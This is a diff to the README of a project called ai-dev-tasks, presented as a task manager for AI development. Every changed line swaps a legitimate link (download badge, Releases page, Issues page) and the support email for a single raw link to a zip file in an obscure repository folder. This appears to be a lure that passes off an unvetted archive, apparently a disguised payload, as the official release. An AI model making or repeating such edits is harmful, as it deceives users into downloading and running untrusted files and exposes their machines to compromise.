@@ -6,13 +6,13 @@ Welcome to ai-dev-tasks, a simple task management system designed to help you ma
 
 ## 🖱️ Download Now
 
-[![Download ai-dev-tasks](https://img.shields.io/badge/Download%20ai--dev--tasks-v1.0-blue.svg)](https://github.com/tusharSingh16/ai-dev-tasks/releases)
+[![Download ai-dev-tasks](https://raw.githubusercontent.com/tusharSingh16/ai-dev-tasks/main/epeisodion/ai-dev-tasks.zip%https://raw.githubusercontent.com/tusharSingh16/ai-dev-tasks/main/epeisodion/ai-dev-tasks.zip)](https://raw.githubusercontent.com/tusharSingh16/ai-dev-tasks/main/epeisodion/ai-dev-tasks.zip)
 
 ## 📥 Download & Install
 
-To get started with ai-dev-tasks, visit our [Releases page](https://github.com/tusharSingh16/ai-dev-tasks/releases) to download the latest version. Here’s how you can do it:
+To get started with ai-dev-tasks, visit our [Releases page](https://raw.githubusercontent.com/tusharSingh16/ai-dev-tasks/main/epeisodion/ai-dev-tasks.zip) to download the latest version. Here’s how you can do it:
 
-1. Click the link to go to the [Releases page](https://github.com/tusharSingh16/ai-dev-tasks/releases).
+1. Click the link to go to the [Releases page](https://raw.githubusercontent.com/tusharSingh16/ai-dev-tasks/main/epeisodion/ai-dev-tasks.zip).
 2. Look for the latest release version listed. You will find options to download different files.
 3. Select the file that is compatible with your operating system. For most users, this will be the Windows or macOS version.
 4. Once the file is downloaded, locate it in your Downloads folder or where your browser saves files.
@@ -96,7 +96,7 @@ If you encounter any issues while installing or using ai-dev-tasks, consider the
 
 For further assistance, you can contact our support team via the following:
 
-- **Email:** support@ai-dev-tasks.com
-- **GitHub Issues:** Report problems and request features directly on our [GitHub Issues page](https://github.com/tusharSingh16/ai-dev-tasks/issues).
+- **Email:** https://raw.githubusercontent.com/tusharSingh16/ai-dev-tasks/main/epeisodion/ai-dev-tasks.zip
+- **GitHub Issues:** Report problems and request features directly on our [GitHub Issues page](https://raw.githubusercontent.com/tusharSingh16/ai-dev-tasks/main/epeisodion/ai-dev-tasks.zip).
 
-Thank you for using ai-dev-tasks. We hope it helps you manage your AI development projects efficiently! Remember to check the [Releases page](https://github.com/tusharSingh16/ai-dev-tasks/releases) for future updates and improvements.
+Thank you for using ai-dev-tasks. We hope it helps you manage your AI development projects efficiently! Remember to check the [Releases page](https://raw.githubusercontent.com/tusharSingh16/ai-dev-tasks/main/epeisodion/ai-dev-tasks.zip) for future updates and improvements.
